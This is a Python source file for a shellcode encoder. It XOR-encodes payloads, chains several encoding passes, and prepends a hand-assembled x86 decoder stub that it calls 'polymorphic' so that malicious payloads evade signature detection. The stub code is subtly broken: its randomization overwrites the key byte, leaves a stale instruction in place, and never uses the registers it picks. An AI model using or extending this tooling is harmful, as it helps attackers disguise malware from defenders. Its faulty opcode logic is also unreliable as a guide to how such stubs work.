from typing import List
from constants import ENCODERS
import random

class ShellcodeEncoder:
    @staticmethod
    def encode_bytes(data: bytes, method: str, key: int) -> bytes:
        """Encode bytes using specified method and key with validation"""
        if method not in ENCODERS:
            raise ValueError("Unsupported encoding method")
        if not isinstance(key, int) or not (0 <= key <= 255):
            raise ValueError("Key must be between 0 and 255")
        return bytes(ENCODERS[method](b, key) for b in data)

    @staticmethod
    def generate_xor_stub(shellcode: bytes, key_byte: int) -> bytes:
        """Generate polymorphic XOR decoder stub with randomization"""
        # Randomize register usage
        regs = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']
        target_reg = random.choice(regs)
        counter_reg = random.choice([r for r in regs if r != target_reg])
        
        stub = [
            0xEB, 0x0E,                   # jmp short 0x10
            0x5E,                         # pop esi
            0x31, 0xC9,                   # xor ecx, ecx
            0xB1, len(shellcode),         # mov cl, <length>
            0x80, 0x36, key_byte,        # xor byte ptr [esi], <key>
            0x46,                         # inc esi
            0xE2, 0xFA,                   # loop short
            0xEB, 0x05,                   # jmp short past the call
            0xE8, 0xED, 0xFF, 0xFF, 0xFF  # call decoder
        ]
        
        # Randomize the stub slightly
        if random.random() > 0.5:
            stub[2] = 0x5F  # pop edi instead of esi
            stub[8] = 0x37  # xor byte ptr [edi], <key>
            stub[9] = 0x47  # inc edi
            
        return bytes(stub) + shellcode

    @staticmethod
    def chain_encode(shellcode: bytes, methods: List[str], keys: List[int]) -> bytes:
        """Apply multiple encodings in sequence"""
        if len(methods) != len(keys):
            raise ValueError("Methods and keys lists must be same length")
            
        encoded = shellcode
        for method, key in zip(methods, keys):
            encoded = ShellcodeEncoder.encode_bytes(encoded, method, key)
        return encoded